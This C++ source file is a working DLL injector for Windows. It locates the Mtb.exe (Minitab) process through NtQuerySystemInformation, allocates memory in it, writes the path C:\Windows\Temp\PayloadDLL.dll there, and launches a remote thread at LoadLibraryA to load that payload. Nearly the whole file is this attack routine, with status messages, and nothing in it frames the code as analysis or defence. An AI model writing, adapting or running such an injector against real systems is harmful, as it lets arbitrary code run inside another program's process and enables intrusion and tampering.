#include <iostream>
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#endif

#define SystemExtendedProcessInformation (SYSTEM_INFORMATION_CLASS)57

#define INJECT_STRING "C:\\Windows\\Temp\\PayloadDLL.dll"

typedef struct _SYSTEM_PROCESS_INFORMATION_FULL {
    ULONG NextEntryOffset;                  // The address of the previous item plus the value in the NextEntryOffset member. For the last item in the array, NextEntryOffset is 0.
    ULONG NumberOfThreads;                  // The NumberOfThreads member contains the number of threads in the process.
    ULONGLONG WorkingSetPrivateSize;        // The total private memory that a process currently has allocated and is physically resident in memory. // since VISTA
    ULONG HardFaultCount;                   // The total number of hard faults for data from disk rather than from in-memory pages. // since WIN7
    ULONG NumberOfThreadsHighWatermark;     // The peak number of threads that were running at any given point in time, indicative of potential performance bottlenecks related to thread management.
    ULONGLONG CycleTime;                    // The sum of the cycle time of all threads in the process.
    LARGE_INTEGER CreateTime;               // Number of 100-nanosecond intervals since the creation time of the process. Not updated during system timezone changes.
    LARGE_INTEGER UserTime;                 // Number of 100-nanosecond intervals the process has executed in user mode.
    LARGE_INTEGER KernelTime;               // Number of 100-nanosecond intervals the process has executed in kernel mode.
    UNICODE_STRING ImageName;               // The file name of the executable image.
    KPRIORITY BasePriority;                 // The starting priority of the process.
    HANDLE UniqueProcessId;                 // The identifier of the process.
    HANDLE InheritedFromUniqueProcessId;    // The identifier of the process that created this process. Not updated and incorrectly refers to processes with recycled identifiers. 
    ULONG HandleCount;                      // The current number of open handles used by the process.
    ULONG SessionId;                        // The identifier of the Remote Desktop Services session under which the specified process is running. 
    ULONG_PTR UniqueProcessKey;             // since VISTA (requires SystemExtendedProcessInformation)
    SIZE_T PeakVirtualSize;                 // The peak size, in bytes, of the virtual memory used by the process.
    SIZE_T VirtualSize;                     // The current size, in bytes, of virtual memory used by the process.
    ULONG PageFaultCount;                   // The total number of page faults for data that is not currently in memory. The value wraps around to zero on average 24 hours.
    SIZE_T PeakWorkingSetSize;              // The peak size, in kilobytes, of the working set of the process.
    SIZE_T WorkingSetSize;                  // The number of pages visible to the process in physical memory. These pages are resident and available for use without triggering a page fault.
    SIZE_T QuotaPeakPagedPoolUsage;         // The peak quota charged to the process for pool usage, in bytes.
    SIZE_T QuotaPagedPoolUsage;             // The quota charged to the process for paged pool usage, in bytes.
    SIZE_T QuotaPeakNonPagedPoolUsage;      // The peak quota charged to the process for nonpaged pool usage, in bytes.
    SIZE_T QuotaNonPagedPoolUsage;          // The current quota charged to the process for nonpaged pool usage.
    SIZE_T PagefileUsage;                   // The total number of bytes of page file storage in use by the process.
    SIZE_T PeakPagefileUsage;               // The maximum number of bytes of page-file storage used by the process.
    SIZE_T PrivatePageCount;                // The number of memory pages allocated for the use by the process.
    LARGE_INTEGER ReadOperationCount;       // The total number of read operations performed.
    LARGE_INTEGER WriteOperationCount;      // The total number of write operations performed.
    LARGE_INTEGER OtherOperationCount;      // The total number of I/O operations performed other than read and write operations.
    LARGE_INTEGER ReadTransferCount;        // The total number of bytes read during a read operation.
    LARGE_INTEGER WriteTransferCount;       // The total number of bytes written during a write operation.
    LARGE_INTEGER OtherTransferCount;       // The total number of bytes transferred during operations other than read and write operations.
    SYSTEM_THREAD_INFORMATION Threads[1];   // This type is not defined in the structure but was added for convenience.
} SYSTEM_PROCESS_INFORMATION_FULL, * PSYSTEM_PROCESS_INFORMATION_FULL;

HANDLE OpenProcessByName(const wchar_t* ImageName) {
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hProcess = 0;
    PSYSTEM_PROCESS_INFORMATION_FULL ProcInfo = 0;
    PSYSTEM_PROCESS_INFORMATION_FULL CurrentProcess = 0;
    ULONG ProcInfoSize = 0;
    ULONG PID = 0;

    while ((status = NtQuerySystemInformation(SystemExtendedProcessInformation, ProcInfo, ProcInfoSize, &ProcInfoSize)) == STATUS_INFO_LENGTH_MISMATCH) {
        if (ProcInfo)
            ProcInfo = (PSYSTEM_PROCESS_INFORMATION_FULL)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ProcInfo, ProcInfoSize);
        else
            ProcInfo = (PSYSTEM_PROCESS_INFORMATION_FULL)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ProcInfoSize);

        if (ProcInfo == 0) {
            printf("[-] Error %d allocating memory for system process information\n", GetLastError());
            return 0;
        }
    }

    if (status != STATUS_SUCCESS) {
        if (ProcInfo)
            HeapFree(GetProcessHeap(), 0, ProcInfo);

        printf("[-] Error 0x%x querying system process informationm\n", status);
        return 0;
    }

    CurrentProcess = ProcInfo;
    while (CurrentProcess->NextEntryOffset != 0) {
        if (CurrentProcess->ImageName.Buffer == 0) {
            CurrentProcess = (PSYSTEM_PROCESS_INFORMATION_FULL)((char*)CurrentProcess + CurrentProcess->NextEntryOffset);
            continue;
        }

        if (wcsstr(CurrentProcess->ImageName.Buffer, ImageName) != 0) {
            PID = (ULONG)CurrentProcess->UniqueProcessId;
            break;
        }

        CurrentProcess = (PSYSTEM_PROCESS_INFORMATION_FULL)((char*)CurrentProcess + CurrentProcess->NextEntryOffset);
    }

    HeapFree(GetProcessHeap(), 0, ProcInfo);
    if (PID == 0) {
        printf("[-] Unable to find process\n");
        return 0;
    }

    hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, PID);
    if (hProcess == 0) {
        printf("[-] Error %d opening handle to process\n", GetLastError());
        return 0;
    }

    return hProcess;
}

int main() {
    HANDLE hMtbProcess = 0;
    HANDLE hRemoteThread = 0;
    HMODULE Kernel32 = 0;
    PVOID RemoteString = 0;
    SIZE_T BytesWritten = 0;

    hMtbProcess = OpenProcessByName(L"Mtb.exe");
    if (hMtbProcess == 0) {
        printf("[-] Unable to open handle to minitab process\n");
        return 0;
    }
    printf("[+] Opened handle to minitab process 0x%x\n", hMtbProcess);

    RemoteString = VirtualAllocEx(hMtbProcess, 0, strlen(INJECT_STRING) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (RemoteString == 0) {
        printf("[-] Error %d allocating memory for injection string\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Remote buffer allocated at 0x%llx\n", RemoteString);

    if (!WriteProcessMemory(hMtbProcess, RemoteString, INJECT_STRING, strlen(INJECT_STRING) + 1, &BytesWritten)) {
        printf("[-] Error %d writing inject string to process\n", GetLastError());
        goto cleanup;
    }

    Kernel32 = GetModuleHandleA("kernel32.dll");
    if (Kernel32 == 0) {
        printf("[-] Error %d getting base address of kernel32.dll\n", GetLastError());
        goto cleanup;
    }

    hRemoteThread = CreateRemoteThread(hMtbProcess, 0, 0x1000, (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32, "LoadLibraryA"), RemoteString, 0, 0);
    if (hRemoteThread == 0) {
        printf("[-] Error %d starting remote thread\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Remote thread started in MTB process!\n");

cleanup:
    if (hMtbProcess)
        CloseHandle(hMtbProcess);
    if (hRemoteThread)
        CloseHandle(hRemoteThread);
	return 0;
}
